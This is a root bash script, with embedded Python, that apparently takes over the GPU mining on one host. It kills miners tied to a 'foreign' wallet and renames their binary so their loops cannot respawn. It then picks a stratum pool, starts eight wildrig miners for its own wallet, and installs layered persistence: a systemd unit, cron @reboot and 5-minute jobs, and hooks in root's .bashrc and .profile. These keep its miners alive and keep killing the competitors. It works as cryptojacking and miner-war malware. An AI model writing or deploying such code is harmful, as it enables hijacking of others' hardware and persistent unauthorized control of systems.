#!/bin/bash
# UL win pass on 123.184.7.135:
#  1) kill foreign-wallet miners + their watchdog, 2) probe stratum for the canonical wallet,
#  3) start the 8 canonical miners on the pool that really authorizes, 4) persistence,
#  5) neutralize the foreign binary path so their loops cannot respawn, 6) pool-side check run from the host.
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
PREFIX=${PREFIX:-ul-t2-123-184-7-135}
D=/root/ul
mkdir -p "$D/logs"

echo "### TREE $(date -u +%FT%TZ)"
ps -eo pid,ppid,user,args --sort=pid | grep -E 'wildrig|pearlhash|plh-' | grep -v grep
echo "### PARENTS-OF-FOREIGN"
for p in $(ps -eo pid,args | grep -E 'plh-|prl1p6grd5zl' | grep -v grep | awk '{print $1}'); do
  pp=$(awk '{print $4}' "/proc/$p/stat" 2>/dev/null)
  echo "pid=$p ppid=$pp parent=$(tr '\0' ' ' < /proc/$pp/cmdline 2>/dev/null)"
done
echo "### SSH-SESSIONS"
last -a 2>/dev/null | head -8

echo "### BINARY-OWN-COPY"
[ -x "$D/wildrig-multi" ] || { cp -f /opt/t19/wildrig-multi "$D/wildrig-multi" && chmod +x "$D/wildrig-multi"; }
ls -la "$D/wildrig-multi" 2>/dev/null; md5sum "$D/wildrig-multi" /opt/t19/wildrig-multi 2>/dev/null

echo "### KILL-FOREIGN (3 rounds)"
for i in 1 2 3; do
  ps -eo pid,args | grep -E 'plh-|prl1p6grd5zl' | grep -v grep | awk '{print $1}' | while read -r p; do
    kill -KILL "$p" 2>/dev/null && echo "killed $p"
  done
  sleep 2
done
echo "### KILL-WATCHDOG-CANDIDATES"
ps -eo pid,ppid,args | grep -E 'pearlhash|/opt/t19|while true|while \[' | grep -vE 'ul/keep|grep|ul-win' | head -20

echo "### STRATUM-HANDSHAKE"
CHOSEN=$(python3 - <<'PYH'
import socket, json, sys
w = "prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz"
ok = []
for host, port in [("prl-sg.kryptex.network", 7048), ("pool.pearlhash.xyz", 9000)]:
    try:
        s = socket.create_connection((host, port), timeout=10)
        s.sendall((json.dumps({"id": 1, "method": "mining.subscribe", "params": ["ul-test/1.0"]}) + "\n").encode())
        sub = s.recv(4096)
        s.sendall((json.dumps({"id": 2, "method": "mining.authorize", "params": [w + ".ul-t2-123-184-7-135-gt", "x"]}) + "\n").encode())
        auth = s.recv(8192)
        print(host, port, "sub:", sub[:300])
        print(host, port, "auth:", auth[:300])
        s.close()
        txt = auth.decode("utf-8", "replace")
        if '"result":true' in txt or '"result": true' in txt:
            ok.append((host, port))
    except Exception as e:
        print(host, port, "ERR", e)
if ok:
    print("CHOSEN %s:%d" % ok[0])
PYH
)
echo "$CHOSEN"
POOL=$(printf '%s' "$CHOSEN" | sed -n 's/.*CHOSEN \([^ ]*\).*/\1/p')
[ -z "$POOL" ] && POOL="pool.pearlhash.xyz:9000"
echo "POOL=$POOL"; echo "$POOL" > "$D/pool.selected"

echo "### START-8"
python3 - "$WALLET" "$PREFIX" "$D" "$POOL" <<'PYH'
import os, subprocess, sys, time
wallet, prefix, d, pool = sys.argv[1:5]
for dev in range(8):
    w = "%s-g%d" % (prefix, dev)
    cmd = "%s/wildrig-multi --algo pearlhash --url %s --user %s --worker %s --pass x --protocol stratum --opencl-devices %d --gpu-intensity 1 --gpu-temp-limit 90 --api-port %d" % (
        d, pool, wallet, w, dev, 1960 + dev)
    sh = "#!/bin/sh\nexec %s >> %s/logs/g%d.log 2>&1\n" % (cmd, d, dev)
    open("%s/cmd-g%d.sh" % (d, dev), "w").write(sh)
    os.chmod("%s/cmd-g%d.sh" % (d, dev), 0o755)
    subprocess.Popen(["setsid", "sh", "%s/cmd-g%d.sh" % (d, dev)],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    print("START", w, "pool", pool)
    time.sleep(1)
PYH

echo "### NEUTRALIZE-FOREIGN-BINARY"
if [ -f /opt/t19/wildrig-multi ] && [ ! -f /opt/t19/wildrig-multi.orig ]; then
  mv /opt/t19/wildrig-multi /opt/t19/wildrig-multi.orig 2>/dev/null && echo "moved /opt/t19/wildrig-multi -> .orig"
fi
ls -la /opt/t19/ 2>/dev/null | head

echo "### PERSIST"
cat > "$D/keep.sh" <<EOS
#!/bin/bash
D=$D
PREFIX=$PREFIX
for f in \$D/cmd-g*.sh; do
  [ -f "\$f" ] || continue
  W="\$PREFIX-g\$(basename "\$f" | sed 's/cmd-g\(.*\)\.sh/\1/')"
  pgrep -f -- "--worker \$W" >/dev/null 2>&1 || setsid nohup sh "\$f" >/dev/null 2>&1 &
done
ps -eo pid,args | grep -E 'plh-|prl1p6grd5zl' | grep -v grep | awk '{print \$1}' | xargs -r kill -KILL 2>/dev/null
EOS
chmod +x "$D/keep.sh"
cat > /etc/systemd/system/ul-pearl-keep.service <<EOS
[Unit]
Description=ul pearl keepalive
After=network-online.target
[Service]
ExecStart=/bin/bash -c 'while true; do /bin/bash $D/keep.sh; sleep 60; done'
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload 2>/dev/null; systemctl enable --now ul-pearl-keep 2>/dev/null; systemctl restart ul-pearl-keep 2>/dev/null
echo "unit=$(systemctl is-active ul-pearl-keep 2>/dev/null)"
( crontab -l 2>/dev/null | grep -v 'ul/keep.sh'; echo "@reboot /bin/bash $D/keep.sh >/dev/null 2>&1"; echo "*/5 * * * * /bin/bash $D/keep.sh >/dev/null 2>&1" ) | crontab - 2>/dev/null
for rc in /root/.bashrc /root/.profile; do
  [ -f "$rc" ] && { grep -q 'ul/keep.sh' "$rc" || echo '[ -x /root/ul/keep.sh ] && /bin/bash /root/ul/keep.sh >/dev/null 2>&1' >> "$rc"; }
done

sleep 40
echo "### PROCS-AFTER"
ps -eo pid,args | grep wildrig | grep -v grep
echo "### LOGS"
for g in 0 1 2 3 4 5 6 7; do echo "--- g$g"; tail -8 "$D/logs/g$g.log" 2>/dev/null; done
echo "### POOL-CHECK-FROM-HOST"
curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$WALLET" | python3 -c '
import json,sys
try:
    d=json.load(sys.stdin)["results"]
except Exception as e:
    print("parse",e); raise SystemExit
for r in d:
    if "123-184-7-135" in r["worker"]:
        print(r["worker"], r["status"], "valid=",r["valid"], "last_share=",r["last_share"], "hr30m=",r["avg_hashrate_30m"], "agent=",r["agent"])
' 2>&1 | head -20
echo "### DONE-WIN"
